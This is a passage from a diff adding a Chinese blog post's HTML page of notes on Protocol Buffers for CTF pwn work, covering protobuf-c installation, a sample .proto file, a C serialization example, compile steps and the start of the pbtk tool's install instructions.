@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Protobuf笔记 - J4f&#39;s blog</title><meta name="author" content=" ">
+<meta name="description" content="">
+  <meta itemprop="name" content="Protobuf笔记">
+  <meta itemprop="datePublished" content="2026-02-02T12:19:31+08:00">
+  <meta itemprop="dateModified" content="2026-02-02T12:24:10+08:00">
+  <meta itemprop="wordCount" content="1790">
+  <meta itemprop="keywords" content="Pwn"><meta property="og:url" content="http://localhost:1313/posts/protobuf/">
+  <meta property="og:site_name" content="J4f&#39;s blog">
+  <meta property="og:title" content="Protobuf笔记">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-02T12:19:31+08:00">
+    <meta property="article:modified_time" content="2026-02-02T12:24:10+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Protobuf笔记">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/1.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/protobuf/" title="Protobuf笔记 - J4f&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/kernel_ebpfpwn/" title="内核ebpfpwn（未完成版）" /><link rel="next" type="text/html" href="http://localhost:1313/posts/mqtt/" title="Mqtt协议pwn" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/protobuf/index.md" title="Protobuf笔记 - J4f's blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Protobuf笔记",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/protobuf\/"
+    },"genre": "posts","wordcount":  1790 ,
+    "url": "http:\/\/localhost:1313\/posts\/protobuf\/","datePublished": "2026-02-02T12:19:31+08:00","dateModified": "2026-02-02T12:24:10+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": " "
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Protobuf笔记</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+       </span></span><span class="post-included-in">&nbsp;included in <a href="/categories/pwn/" class="post-category" title="Category - Pwn"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div><div class="post-meta-line"><span title="published on 2026-02-02 12:19:31"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-02-02">2026-02-02</time></span>&nbsp;<span title="1790 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>9 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#安装使用">安装使用</a></li>
+        <li><a href="#基础知识">基础知识</a></li>
+        <li><a href="#工具逆向">工具逆向</a></li>
+        <li><a href="#手动逆向">手动逆向</a>
+          <ul>
+            <li><a href="#message">message</a></li>
+            <li><a href="#成员">成员</a></li>
+            <li><a href="#字段描述符">字段描述符</a>
+              <ul>
+                <li><a href="#id"><strong>id</strong></a></li>
+                <li><a href="#label"><strong>label</strong></a></li>
+                <li><a href="#type"><strong>type</strong></a></li>
+              </ul>
+            </li>
+            <li><a href="#版本">版本</a></li>
+            <li><a href="#偏移问题">偏移问题</a></li>
+          </ul>
+        </li>
+        <li><a href="#脚本">脚本</a></li>
+        <li><a href="#例题">例题</a>
+          <ul>
+            <li><a href="#ciscn-2024-华中赛区半决赛">CISCN 2024 华中赛区半决赛</a></li>
+          </ul>
+        </li>
+        <li><a href="#参考文章">参考文章</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h3 class="heading-element" id="安装使用"><span>安装使用</span>
+  <a href="#%e5%ae%89%e8%a3%85%e4%bd%bf%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>安装：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get update
+</span></span><span class="line"><span class="cl">sudo apt-get install -y protobuf-compiler libprotobuf-dev
+</span></span><span class="line"><span class="cl">sudo apt-get install libprotobuf-c-dev protobuf-c-compiler</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>protoc-c &ndash;version用这句来验证是否安装完成</p>
+<p>创建一个文件<code>user.proto</code>，写入：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">syntax = &#34;proto3&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">message User {
+</span></span><span class="line"><span class="cl">  int32 id = 1;
+</span></span><span class="line"><span class="cl">  string name = 2;
+</span></span><span class="line"><span class="cl">  string email = 3;
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>使用以下命令生成C代码：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">protoc --c_out=. ./user.proto</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这会在当前目录下生成两个文件：<code>user.pb-c.h</code>和<code>user.pb-c.c</code></p>
+<p><strong><code>user.pb-c.h</code></strong>：头文件，定义了消息类型（如<code>User</code>结构体）及其相关的函数。</p>
+<p><strong><code>user.pb-c.c</code></strong>：源文件，实现了这些函数，包含序列化和反序列化等操作。</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ tree .          
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── user.pb-c.c
+</span></span><span class="line"><span class="cl">├── user.pb-c.h
+</span></span><span class="line"><span class="cl">└── user.proto
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> directories, <span class="m">3</span> files</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>在C程序中，需要包含生成的<code>user.pb-c.h</code>头文件，这样就可以使用<code>User</code>消息类型及其相关的protobuf操作函数。</p>
+<p>打个比方</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//pwn.c
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;user.pb-c.h&#34;  // 包含生成的头文件</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 创建一个 User 对象，并初始化
+</span></span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="n">USER__INIT</span><span class="p">;</span>  <span class="c1">// 生成的宏用于初始化User结构体
+</span></span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>  <span class="c1">// 设置用户ID
+</span></span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;John Doe&#34;</span><span class="p">;</span>  <span class="c1">// 设置用户名
+</span></span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="p">.</span><span class="n">email</span> <span class="o">=</span> <span class="s">&#34;john.doe@example.com&#34;</span><span class="p">;</span>  <span class="c1">// 设置用户邮箱
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 序列化消息
+</span></span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">serialized_size</span> <span class="o">=</span> <span class="nf">user__get_packed_size</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="p">);</span>  <span class="c1">// 获取序列化消息所需的大小
+</span></span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">serialized_size</span><span class="p">);</span>  <span class="c1">// 分配内存存放序列化数据
+</span></span></span><span class="line"><span class="cl">    <span class="nf">user__pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>  <span class="c1">// 序列化数据到buffer
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Serialized User data to %zu bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">serialized_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 反序列化消息
+</span></span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="o">*</span><span class="n">new_user</span> <span class="o">=</span> <span class="nf">user__unpack</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">serialized_size</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>  <span class="c1">// 从二进制数据反序列化为User对象
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">new_user</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error unpacking User message</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 输出解包后的User数据
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;ID: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">new_user</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">new_user</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Email: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">new_user</span><span class="o">-&gt;</span><span class="n">email</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 清理内存
+</span></span></span><span class="line"><span class="cl">    <span class="nf">user__free_unpacked</span><span class="p">(</span><span class="n">new_user</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>  <span class="c1">// 释放反序列化后的对象
+</span></span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>  <span class="c1">// 释放序列化的缓冲区内存
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>然后对其进行编译</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gcc -o pwn user.pb-c.c pwn.c -lprotobuf-c</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>在这个命令中：</p>
+<ul>
+<li><code>user.pb-c.c</code> 是由 <code>protoc</code> 生成的 C 源文件。</li>
+<li><code>your_program.c</code> 是编写的包含主程序的 C 文件。</li>
+<li><code>-lprotobuf-c</code> 指定链接 Protobuf-C 库。</li>
+</ul>
+<p>然后就可以看到，我们生成了一个pwn文件</p>
+<h3 class="heading-element" id="基础知识"><span>基础知识</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
+<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
+<h3 class="heading-element" id="工具逆向"><span>工具逆向</span>
+  <a href="#%e5%b7%a5%e5%85%b7%e9%80%86%e5%90%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://github.com/marin-m/pbtk" target="_blank" rel="external nofollow noopener noreferrer">pbtk</a>逆向protobuf的工具</p>
+<p>安装</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5
+</span></span><span class="line"><span class="cl">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client
